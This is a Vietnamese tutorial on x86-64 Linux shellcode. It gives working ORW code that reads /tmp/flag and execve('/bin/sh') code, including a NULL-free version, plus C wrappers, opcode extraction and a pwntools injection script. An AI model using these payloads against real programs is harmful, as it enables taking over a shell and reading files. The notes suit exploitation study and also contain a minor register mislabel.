**ORW Shellcode**
* Mục đích của `ORW Shellcode` là viết 1 đoạn mã assembly để máy tính thực hiện chuỗi 3 hành động liên tiếp :
  1. `Open` : Mở 1 tệp mục tiêu (VD: `/tmp/flag`)
  2. `Read` : Đọc nội dung của tệp đó vào bộ nhớ đệm(buffer)
  3. `Write`: In nội dung của bộ nhớ đệm ra màn hình cho hacker hoặc người dùng xem
* `File Descript (fd)`
  - Là một số định danh mà hệ điều hành cấp cho các tệp đang mở
  - `0`(STDIN - Nhập) ;`1`(STDOUT - Xuất ra màn hình) ; `2`(STDERR - Lỗi)
  - Khi ta mở 1 tệp mới bằng system call `open()`, tệp đó sẽ thường nhận giá trị `fd = 3`(hoặc lớn hơn)

* Khung mã Shellcode orw
  - Số thứ tự của mỗi lệnh gọi hệ thống được sử dụng trong Shellcode orw và các đối số cần được thiết lập trong mọi thanh theo bảng sau:
    <img width="571" height="228" alt="image" src="https://github.com/user-attachments/assets/0d64d342-d9ad-46eb-9499-041d2ebbc4d5" />
  - Để yêu cầu hệ điều hành thực hiện 1 tác vụ( như `open`,`read`,`write`) thì ta phải truyền các đối số vào đúng các thanh ghi quy định trước ghi gọi lệnh `syscall`:
    + `rax`(System call number - Số hiệu gọi hệ thống) : Chứa mã số của lệnh  hệ thống mà mình muốn gọi
      VD: `0` cho `read` , `1` cho `write` hay `2` cho `open`
    + `rdi`(Argument 0) : Đối số thứ nhất
    + `rsi`(Argument 1) : Đối số thứ 2
    + `rsi`(Argument 2) : Đối số thứ 3


  * Cho 1 đoạn mã giả C sau :
    ```sh
    char buf[0x30]; // temporary buffer - Tạo bộ đệm tạm thời 

    int fd = open("/tmp/flag", RD_ONLY, NULL);
    read(fd, buf, 0x30); 
    write(1, buf, 0x30);
    ```
  * Triển khai 3 system call bằng assembly
   - Để gọi 1 system call(syscall) trong linux x86-64 ta cần đặt mã số của syscall vào thanh ghi `rax` và đặt các đối số lần lượt vào `rdi`,`rsi`,`rdx`

 Bước 1 : `open("/tmp/flag", 0_RDONLY,NULL)`
 -
 * <img width="553" height="124" alt="image" src="https://github.com/user-attachments/assets/1f768be7-1b71-48c2-a135-aa0f50b3d92f" />

 * Mục đích : mở tệp để đọc
 * Thực thi như sau :
    - Đẩy chuỗi `"/tmp/flag"` lên đỉnh stack(chia làm 2 phần push dưới dạng mã Hex little-endian là `0x67` và `0x616c662f706d742f`).
       + Ta thấy ở đây cụm `/tmp/flag` là có 9 byte thêm 1 byte null(`\0`) ở đuôi nữa là thành 10 byte mà mỗi lần sử dụng lệnh push để đẩy dữ liệu lên stack thì CPU chỉ cho đẩy tối đa là 8 byte(64 bit), ta ko thể đẩy hết liền 1 lúc 10 byte đi đc nên phải chia thành 2 lần .
       + Với cơ chế stack thì stack phát triển ngược từ địa chỉ cao xuống địa chỉ thấp, để đọc chuỗi từ đỉnh ngăn xếp theo đúng thứ tự thì ta phải đẩ phần cuối của chuỗi lên stack trước, sau đó mới đẩy phần đầu đè lên. Với cơ chế của little-Endian, tức là các byte ít quan trọng nhất sẽ được lưu ở địa chỉ thấp nhất(từ trái sang phải của chuỗi), do đó các byte khi gán vào thanh ghi ta phải ghi ngược lại
       + `push 0x67`: Đẩy phần cuối của chuỗi là chữ `g` và byte NULL kết thúc chuỗi lên stack, vì stack hoạt động theo khối mỗi 8byte nên CPU sẽ tự động thêm các số 0 vào cho đủ 8byte: `0x0000000000000067` . khi ấy trên stack sẽ là `67 00 00 00 00 00 00 00` ta vừa ghi đc chữ `g` lên stack mà vừa có sẵn byte NULL(00).
       + `mov rax, 0x616c662f706d742f` : Đưa 8 ký tự đầu tiên của chuỗi vào thanh ghi `rax`, vì CPU ko cho phép lệnh push nhận trực tiếp 1 hằng số lớn 64-bit nên ta phải đi vòng bằng cách gán chuỗi vào thanh ghi như `rax`
       + `push rax`: sau khi đã gán chuỗi vào thanh ghi rax thì ta đẩy 8 ký tự từ thanh ghi này lên stack 1 cách hợp lệ , khi ấy khối 8byte này sẽ đc đặt ngay trên đỉnh của khối chứ chữ `g` lúc nãy và tạo thành 1 chuỗi hoàn chỉnh trên ngăn xếp theo thứ tự từ thấp lên cao . Lúc này `rsp` đang trỏ vào ký tự `/` và sẵn sàng đọc bộ nhớ và ghép lại thành chuỗi `"/tmp/flag\0"`
    - `rdi = rsp` : Lấy địa chỉ của chuỗi trên stack làm đối số thứ nhất
    - `rsi = 0` : Cờ `0_RDONLY` - chỉ đọc
    - `rdx = 0` : Mode(ko cần thiết khi đọc)
    - `rax = 2` : mã syscall của `open`
    - Gọi `syscall` : kết quả (`fd`) sẽ đc trả về và lưu trong thanh ghi `rax`
    - ```sh
      push 0x67
      mov rax, 0x616c662f706d742f 
      push rax
      mov rdi, rsp    ; rdi = "/tmp/flag"
      xor rsi, rsi    ; rsi = 0 ; RD_ONLY
      xor rdx, rdx    ; rdx = 0
      mov rax, 2      ; rax = 2 ; syscall_open
      syscall         ; open("/tmp/flag", RD_ONLY, NULL)
      ```
  Bước 2: `read(fd, buf, 0x30)`
  -
  * <img width="554" height="103" alt="image" src="https://github.com/user-attachments/assets/23eb3dbb-7fa2-4936-9ac4-c243601241c7" />
  * Mục đích : Đọc 0x30(48 bytes) từ tệp vừa mở vào một vùng nhớ tạm(buffer)
  * Thực thi :
    - `rdi = rax` : Đưa fd vừa nhận được ở bước 1 vào `rdi`
    - `rsi = rsp - 0x30` : cấp phát 1 vùng nhớ an toàn trên stack để làm buffer(tránh ghi đè dữ liệu quan trọng), khi có vùng nhớ này rồi thì hàm read sẽ lấp đầy theo chiều từ thấp lên cao  và chạm tới rsp là đủ 48 byte, tránh ghi đè lên các thanh ghi hay dữ liệu quan trọng khác phía trên cao hơn của `rsp`
    - `rdx = 0x30` : Đọc tối đa 0x30 bytes
    - `rax = 0` : Mã syscall của hàm `read`
    -  Gọi `syscall`
       
    -  ```sh
       mov rdi, rax      ; rdi = fd
       mov rsi, rsp
       sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
       mov rdx, 0x30     ; rdx = 0x30     ; len
       mov rax, 0x0      ; rax = 0        ; syscall_read
       syscall           ; read(fd, buf, 0x30)
       ```
 Bước 3: `write(1, buf, 0x30)`
 -
 * <img width="551" height="101" alt="image" src="https://github.com/user-attachments/assets/2e7c71c9-63ba-49b2-b865-6c12428bc646" />

 * Mục đích : Ghi dữ liệu từ buffer ra STDOUT(màn hình)
 * Thực hiện :
   - `rdi = 1` : Đặt fd = 1 (Chuẩn đầu ra màn hình)
   - `rsi` và `rdx` : Không cần thiết lập lại vì quy chuẩn linux x86-64 ABI sẽ giữ nguyên giá trị của 2 thanh ghi này từ lệnh `read` trước đó(buffer và chiều dài vẫn là 0x30-48byte)
   - `rax = 1` : Mã syscall của `write`
   - Gọi syscall
   - ```sh
     mov rdi, 1        ; rdi = 1 ; fd = stdout
     mov rax, 0x1      ; rax = 1 ; syscall_write
     syscall           ; write(fd, buf, 0x30)
     ```
* Đoạn mã hoàn chỉnh :
  ```sh
  ;Name: orw.S

push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)  
```

* 1 Đoạn mã Assembly thuần túy(như các lệnh `push`,`mov`,`syscall`) chỉ là các chỉ thị thô , nó không tuân theo định dạng chuẩn của 1 tệp thực thi trên Linux là ELF(Executable and Linkable Format). Tệp ELF cần phải có phần đầu header(tiêu đề), phần vùng code, phân vùng data,... vậy nên cách nhanh nhất để chạy shellcode là nhúng nó vào 1 tệp mã C. Trình biên dịch C(như `gcc`) sẽ lo phần tạo cấu trúc ELF chuẩn và biến đoạn shellcode thành 1 hàm bên trong chương trình đó.Đoạn C được dùng để nhúng đoạn mã assembly vào gọi là Skeleton Code
* Mã khung C được thiết kế sử dụng chỉ thị `__asm__()`- một tính năng cho phép viết trực tiếp mã assembly vào bên trong chương trình 
```sh
// Tên tệp: sh-skeleton.c
// Lệnh biên dịch: gcc -o sh-skeleton sh-skeleton.c -masm=intel

__asm__(
    ".global run_sh\n"     // Khai báo hàm run_sh là hàm toàn cục (global)
    "run_sh:\n"            // Nhãn bắt đầu của hàm run_sh

    "Nhập shellcode của bạn vào đây.\n"
    "Mỗi dòng kết thúc bằng '\\n'\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c  # rax = sys_exit (Mã syscall để thoát chương trình)\n"
    "syscall        # exit(0)" 
);

void run_sh(); // Khai báo nguyên mẫu hàm trong C

int main() { 
    run_sh(); // Khi chương trình C chạy, nó sẽ gọi thẳng vào đoạn shellcode
}
```
* ```sh
    // tên tệp : orw.c
    // Lệnh biên dịch : ggc -o orw orw.c -masm=intel

    __asm__(
    ".global run_sh \n"
    "run_sh: \n"

    "push 0x67 \n"
    "mov rax,0x616c662f706d742f \n"
    "push rax \n"

    "mov rdi, rsp \n"
    "xor rsi, rsi \n"
    "xor rdx, rdx \n"
    "mov rax, 2 \n"
    "syscall \n"

    " mov rdi, rax \n"
    " mov rsi, rsp \n"
    " sub rsi, 0x30 \n"
    " mov rdx, 0x30 \n"
    " mov rax, 0 \n"
    "syscall \n"

    "mov rdi, 1 \n"
    "mov rax, 0x1 \n"
    "syscall \n"

    "mov rdi, 1 \n"
    "mov rax, 0x3c \n"
    "syscall \n"
     );

    void run_sh();
    int main() { run_sh();}

  ```

* Biên dịch mã C thành tệp thực thi : `gcc -o orw orw.c -masm=intel` : lệnh này sẽ lấy tệp orw.c tạo thành 1 tệp thực thi ELF có tên là `orw`
* Tạo 1 tệp giả lập có chứ cờ để ktra xem shellcode có thành công hay ko : `echo '{Xin_chuc_mung_da_viet_thanh_cong!}' > /tmp/flag` . Vì shellcode của ta lập trình để đọc `/tmp/flag` nên phải có lệnh này để sau đó ta kiểm tra.
* `./orw` khởi chạy tệp vừa biên dịch xem có ra là cờ mình vừa tạo ko để ktra shellcode
   
`EXECVE SHELLCODE`
-
* Mục tiêu : trong system hacking thì chiếm được shell đồng nghĩa với việc kiểm soát toàn bộ hệ thống
* System Call `execve()` : là 1 lời gọi hệ thống dùng để thực thi 1 chương trình , bản chất của nó là tiêu diệt bộ nhớ của tiến  trình hiện tại và thay thế nó bằng 1 tiến trình mới(ở đây là `/bin/sh`) nhưng sẽ vẫn giữ nguyên các quyền và cổng kết nối(file descriptors)
* Để gọi thành công `execve("/bin/sh", NULL, NULL)`, ta phải thiết lập chính xác 4 thanh ghi sau trước khi gọi lệnh `syscall`:
  - `rax` : với mã syscall là `0x3b`(tương đương số 59 trong hệ thập phân)
  - `rdi` : đối số thứ nhất(filename) - con trỏ địa chỉ trỏ tới chuỗi `"/bin/sh\x00"`
  - `rsi` : đối số thứ 2(`argv`) = `0`(NULL)
  - `rdx` : đối số thứ 3(`envp`) = `0`(NULL)
* Đoạn mã shellcode cơ bản sẽ như sau:
```sh
 ;Name: execve_basic.S
 mov rax, 0x68732f6e69622f  ; hex của chuỗi "/bin/sh" theo little-endian
 push rax                   ; đẩy chuỗi lên stack, push tự động thêm byte NULL(00) vào sau cho đủ 8 byte
 mov rdi, rsp               ; rdi = địa chỉ của chuỗi "/bin/sh\x00"

 xor rsi, rsi               ; rsi = 0
 xor rdx, rdx               ; rdx = 0

 mov rax, 0x3b              ; mã syscall của `execve`
 syscall                    ; kích hoạt execve("/bin/sh", NULL, NULL)
```
- Nhưng với đoạn mã cơ bản này có 1 nhược điểm là việc mã máy sinh ra từ lệnh `mov rax, 0x3b` sẽ chứa byte NULL(`\00`). nếu như khi ta dùng đoạn mã này đi khai thác qua các hàm xử lý chuỗi(như `strcpy`,`gets`), shellcode sẽ bị đứt gãy và gây crash hệ thống
* Đoạn mã shellcode thực chiến : được viết băng các thủ thuật assembly để ko sinh ra bất kì byte `00` nào trong mã máy.
```sh
  ; Khởi tạo argv và envp bằng 0 an toàn (xor không sinh ra byte NULL)
    xor rsi, rsi                ; rsi = NULL
    xor rdx, rdx                ; rdx = NULL

 ; Đưa chuỗi vào Stack một cách hoàn hảo
    mov rbx, 0x68732f2f6e69622f ; Đẩy chuỗi "/bin//sh" (8 bytes) thay vì "/bin/sh" (7 bytes)
    push rbx                    ; Vừa khít thanh ghi 64-bit, loại bỏ hoàn toàn byte NULL thừa
    mov rdi, rsp                ; rdi = địa chỉ của chuỗi "/bin//sh"

 ; Cài đặt mã syscall an toàn (Thủ thuật Push/Pop)
    push 0x3b                   ; Lệnh này mã máy chỉ là `6a 3b` (2 bytes, không có NULL)
    pop rax                     ; Rút 0x3b từ Stack vào rax (Mã máy là `58`)

   syscall                     
```
* Nhúng chương trình vào khung C :
```sh
     // Lưu tên file: shell.c
     // Lệnh biên dịch: gcc -o shell shell.c -masm=intel

  __asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "xor rsi, rsi \n"
    "xor rdx, rdx \n"
    "mov rbx, 0x68732f2f6e69622f \n"
    "push rbx \n"
    "mov rdi, rsp \n"
    "push 0x3b \n"
    "pop rax \n"
    "syscall \n"
    

    // Syscall Exit (Thoát an toàn nếu execve thất bại)
    "xor rdi, rdi \n"
    "mov rax, 0x3c \n"
    "syscall \n"
  );

  void run_sh();

  int main() { 
    run_sh(); 
    return 0;
   }
```
- ta sử dụng mã C này để kiểm tra và gỡ lỗi trước ghi đem đi tấn công . 
* Để tấn công ta cần phải trích xuất mã máy (opcodes)
  - Khi ta viết mã khai thác bằng python , ta ko thể nhét nguyên 1 đoạn code chứ assembly vào chương trình mục tiêu đc , vì máy tính chỉ hiểu mã máy(các byte thập lục phân)
  - Có 4 bước chuẩn hóa như sau:
    + Biên dịch thành Tệp đối tượng(object file) : `nasm -f elf64 execve.S` : Dịch từ file assemby sang file `.o`(Định dạng ELF64)
    + Kiểm tra lại mã máy(disassemble): Dùng `objdump -d execve.o`
    + Dùng `objcopy` để bóc tách phân vùng `.text` ra thành 1 file nhị phân thuần túy tên là `execve.bin` : `objcopy --dump-section .text=execve.bin execve.o`
    + Định dạng thành chuỗi payload(formatting) : `xxd -p execve.bin | tr -d '\n' | sed 's/../\\x&/g'`
      <img width="396" height="179" alt="image" src="https://github.com/user-attachments/assets/2273b1aa-b3ae-4b2d-8496-1a0b79d25ffe" />
    + <img width="403" height="192" alt="image" src="https://github.com/user-attachments/assets/8e05c903-e303-48bf-a800-1390e733fe89" />
    + Đoạn chuỗi dài cuối chính là payload mà ta mong muốn 

  - Tuy nhiên ta có thể sử dụng tính năng `asm()` tích hơp sẵn trong thư viện pwntools của python nó sẽ tự động làm cả 4 bước trên.
  - Ví dụ 1 đoạn mã python có sử dụng nó trông như thế này 
    ```sh
    from pwn import *

     # Khai báo kiến trúc máy mục tiêu
        context.arch = 'amd64'

    # Pwntools tự động dịch Assembly sang chuỗi mã máy
    shellcode = asm('''
       xor rsi, rsi
       xor rdx, rdx
       mov rbx, 0x68732f2f6e69622f
       push rbx
       mov rdi, rsp
       push 0x3b
       pop rax
       syscall
    ''')

    # Gửi thẳng vào chương trình mục tiêu
     p = process('./chuong_trinh_loi')
     p.sendline(shellcode)
  ```
**Lưu ý** : 
* Ta sử dụng mã C(Skeleton Code + GCC) với mục đích để testing & debugging :
  - Ta sử dụng mã C làm 1 cái vỏ bọc tạm thời
    + Khi đang trong  giai đoạn phát triển shellcode, ta cần chạy xem nó có in ra cờ không, hoặc cần ném nó vào trình gỡ lỗi GDB để soi từng thanh ghi
    + Về mặt bản chất thì trình biên dịc C(`gcc`) sẽ lấy đoạn mã assembly bọc thêm các thông tin cần thiết của hệ điều hành và tạo thành 1 file thực thi độc lập, hoàn chỉnh(như file`./orw` hay`./execve`)
* Ta sử dụng phương pháp trích xuất (NASM +objump/objcopy/xxd) với mục đích thực chiến / khai thác
  - khi ta dùng phương pháp bên trên và xác nhận shellcode chạy hoàn hảo trong GDB thì sẽ là lúc mang nó đi hack 1 chươnnh trình bị lỗi
  - Các lỗ hổng của chương trình mục tiêu ko thể hiểu dược file C hay ELF mà chỉ cho phép bạn bơm vào bộ nhớ của nó các byte dữ liệu thô (raw bytes/ machine code) do đó ta phải sử dụng phương pháp trích xuất này 
  - Ta sẽ viết script Python(như Pwntoools) đẻ gửi payload tấn công vào chương trình mục tiêu
  -> Về mặt bản chất thì khi đó ta sẽ loại bỏ toàn bộ những thứ vỏ bọc rườm rà của hệ điều hành mà chỉ dữ lại đúng cái chuỗi byte mã máy độc hại (VD: \x48\x32\xf6......), chuỗi này sẽ đc bơm thẳng qua lỗ hổng vào bộ nhớ chương trình mục tiêu sau đó ta sẽ ép CPU của hệ thống mục tiêu chạy thẳng các byte này  
